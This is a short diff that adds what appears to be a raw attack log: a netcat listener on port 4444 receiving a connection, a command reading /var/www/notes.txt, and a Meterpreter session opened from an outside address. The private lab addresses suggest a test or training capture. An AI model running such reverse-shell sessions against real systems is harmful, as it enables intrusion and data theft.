@@ -1,0 +1,5 @@
+listening on [any] 4444 ...
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 49158
+cat /var/www/notes.txt
+connect to [192.168.56.102] from (UNKNOWN) [10.66.66.66] 31337
+[*] Meterpreter session 2 opened (192.168.56.102:4444 -> 10.66.66.66:31337) at 2026-10-08 17:00:00 +0200
